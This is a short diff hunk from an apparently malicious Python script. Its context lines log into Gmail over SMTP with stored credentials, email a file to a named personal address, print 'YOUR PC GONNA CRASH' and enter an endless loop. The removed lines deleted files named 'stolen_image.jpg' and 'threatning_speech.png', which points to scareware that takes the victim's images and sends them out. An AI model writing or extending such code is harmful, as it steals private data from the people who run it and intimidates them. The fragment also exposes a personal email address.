@@ -38,9 +38,6 @@ smtp = smtplib.SMTP_SSL("smtp.gmail.com",  465)
 smtp.login(EMAIL, PASSWORD)
 smtp.sendmail(EMAIL, 'viraj.sharma1501@gmail.com', str(msg))
 
-os.remove('stolen_image.jpg')
-os.remove('threatning_speech.png')
-
 print('YOUR PC GONNA CRASH')
 
 while True:
